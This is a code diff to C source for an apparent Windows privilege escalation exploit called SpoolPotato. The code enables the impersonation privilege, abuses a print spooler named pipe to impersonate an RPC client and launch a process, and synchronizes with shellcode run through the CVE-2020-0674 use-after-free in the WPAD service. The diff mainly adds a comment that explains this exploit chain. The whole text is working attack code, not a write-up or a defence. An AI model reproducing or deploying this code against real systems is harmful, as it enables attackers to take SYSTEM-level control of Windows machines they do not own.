@@ -72,7 +72,7 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 
                     if (!LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), NULL, (PDWORD)&dwPrivilegeNameLength) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                         dwPrivilegeNameLength++; // Returned name length does not include NULL terminator
-                        wchar_t *pCurrentPrivilegeName = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPrivilegeNameLength * sizeof(WCHAR));
+                        wchar_t *pCurrentPrivilegeName = (wchar_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPrivilegeNameLength * sizeof(WCHAR));
 
                         if (LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), pCurrentPrivilegeName, (PDWORD)&dwPrivilegeNameLength)) {
                             if (!_wcsicmp(pCurrentPrivilegeName, PrivilegeName)) {
@@ -281,7 +281,7 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
 }
 
 BOOL SpoolPotato() {
-    if (EnablePrivilege(SE_IMPERSONATE_NAME)) {
+    if(EnablePrivilege(SE_IMPERSONATE_NAME)) {
         wchar_t* pSpoolPipeUuidStr = NULL;
         HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
         HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
@@ -301,6 +301,31 @@ BOOL SpoolPotato() {
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS)) {
                     HANDLE hSyncEvent; // Event object to sync success status with WPAD client
                     DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event object with WPAD client...");
+
+                    /*
+                    SpoolPotato/WPAD client synchronization
+
+                    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
+                    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
+                    often yield a successful status from WPAD.
+
+                    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
+                    attempt to trigger the PAC download until it receives confirmation via an event object from within
+                    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
+                    the CVE-2020-0674 UAF.
+
+                    The WPAD client initially:
+                    1. Creates an unsignalled event object and then proceeds to repeatedly make RPC calls to WPAD in a loop
+                    2. Between each iteration of the loop it spends several seconds waiting for a signal on its event object.
+                       If this operation times out, it continues the loop.
+                    3. Once the event has been signalled the WPAD client ends its loop and terminates.
+
+                    Meanwhile the SpoolPotato shellcode:
+                    1. Makes its privilege escalation operations.
+                    2. Waits for the named event object from the WPAD client to be created.
+                    3. Signals the event object once it has been created.
+                    4. Terminates itself.
+                    */
 
                     while ((hSyncEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"DoubleStarSync")) == NULL) {
                         Sleep(500);
